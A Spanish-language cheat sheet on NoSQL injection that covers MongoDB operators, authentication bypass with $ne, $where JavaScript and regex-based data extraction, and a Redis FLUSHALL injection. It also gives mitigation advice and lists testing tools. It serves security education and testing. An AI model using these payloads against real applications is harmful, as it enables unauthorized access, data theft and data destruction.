---
icon: folder-open
---

# NoSQL injection

### 🗄️ ¿Qué es NoSQL Injection?

**NoSQL Injection** es una vulnerabilidad que permite manipular consultas en bases de datos NoSQL mediante la inyección de datos maliciosos.

A diferencia de SQL, las bases NoSQL usan distintos formatos:

* **MongoDB**: documentos tipo JSON
* **CouchDB**: consultas JSON + MapReduce
* **Redis**: comandos clave-valor
* **Cassandra**: CQL

Un atacante puede:

* Bypassear autenticación
* Extraer datos sensibles
* Modificar o eliminar datos
* Ejecutar código (en algunos casos)
* Provocar DoS

***

### 🧱 Tipos de bases NoSQL

#### 📄 Documentales (MongoDB, CouchDB)

```javascript
db.users.find({username: "admin", password: "pass123"})
```

Inyección:

```javascript
db.users.find({username: {"$ne": null}, password: {"$ne": null}})
```

Devuelve todos los usuarios.

#### 🔑 Key-Value (Redis)

```http
GET user:1234
```

Inyección:

```http
GET user:1234\nFLUSHALL
```

#### 📊 Columnar (Cassandra)

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```

#### 🧠 Grafos (Neo4j)

```cypher
MATCH (u:User {username: 'admin'}) OR 1=1//
```

***

### ⚙️ Operadores en MongoDB

#### 🔢 Comparación

* `$eq`, `$ne`, `$gt`, `$lt`, `$gte`, `$lte`
* `$in`, `$nin`

#### 🔗 Lógicos

* `$and`, `$or`, `$not`, `$nor`

#### 🧩 Elementos

* `$exists`
* `$type`

#### 🧠 Evaluación

* `$regex`
* `$where`
* `$expr`

***

### 💣 Vectores comunes

#### 🔓 Bypass de autenticación

```javascript
{username: "admin", password: {"$ne": ""}}
```

#### 🧨 Inyección tautológica

```javascript
?category=Gifts'||'1'=='1
```

#### 🧬 Inyección de operadores

```json
{"username": "admin", "password": {"$ne": null}}
```

#### 💻 Inyección JavaScript

```json
{"$where": "this.username == 'admin' || '1'=='1'"}
```

#### 🔍 Inyección con regex

```javascript
{password: {"$regex": "^a.*"}}
```

***

### 🧪 Técnicas de extracción de datos

#### 🔤 Extracción carácter a carácter

```javascript
{password: {"$regex": "^ab.*"}}
```

#### 📏 Longitud

```javascript
this.password.length == 8
```

#### 🔍 Descubrimiento de campos

```javascript
{fieldname: {"$exists": true}}
```

#### ⚖️ Boolean-based

```javascript
' && this.password[0] == 'p'
```

#### ⏱️ Time-based

```json
{"$where": "sleep(5000)"}
```

***

### 🚀 Explotación avanzada

#### 🧠 Descubrir nombres de campos

```javascript
Object.keys(this)[3]
```

#### 🔐 Acceso condicional

```json
{"$where": "this.role == 'admin'"}
```

#### 📊 Inyección en agregaciones

```json
{"$project": {"password": 1}}
```

#### ⚙️ MapReduce

```javascript
function(doc) {
  if (doc.username == 'admin' || true) {
    emit(doc._id, doc);
  }
}
```

***

### 🔍 Métodos de detección

#### 💥 Error-based

```json
{"$ne": ""}
{"$regex": ".*"}
```

#### ⚖️ Boolean-based

```javascript
?user=admin'||'1'=='1
```

#### ⏱️ Time-based

```json
{"$where": "sleep(5000)"}
```

#### 🧪 Testing de operadores

```json
{"$gt": ""}
{"$where": "1"}
```

***

### 💥 Impacto

* Acceso a cuentas sin contraseña
* Escalada de privilegios
* Extracción de datos sensibles
* Manipulación de lógica de negocio
* Ejecución de código
* Denegación de servicio

***

### 🌍 Casos reales

* MongoDB expuesto (ransomware)
* Bug bounties con bypass de login
* E-commerce (manipulación de precios)

***

### 🛡️ Mitigación

#### 🚫 Validación de entrada

```javascript
if (operators.includes(key)) throw Error
```

#### 🔐 Validación de tipos

```javascript
typeof username === 'string'
```

#### 🧪 Queries seguras

```javascript
username: String(req.body.username)
```

#### 💻 Deshabilitar JavaScript

```bash
mongod --noscripting
```

#### 🔒 Mínimo privilegio

* Usuario DB con permisos limitados

#### 📋 Validación de esquema

```javascript
bsonType: "string"
```

#### 🧱 Uso de ORM/ODM

* Ej: Mongoose
* Protección integrada

***

### 🧪 Metodología de testeo

1. Identificar uso de NoSQL
2. Probar payloads básicos
3. Testear operadores
4. Boolean/time-based
5. Extraer datos
6. Descubrir campos

***

### 🛠️ Herramientas

#### 🧪 Burp Suite

* Intruder
* Repeater
* Extensiones

#### 💣 NoSQLMap

```bash
nosqlmap -u http://target.com/login
```

#### 🐍 Script automatizado

```python
for char in charset:
    payload = {"$where": "..."}
```

#### 🤖 Automatización

* Extracción de caracteres
* Enumeración de campos
* Descubrimiento de longitud
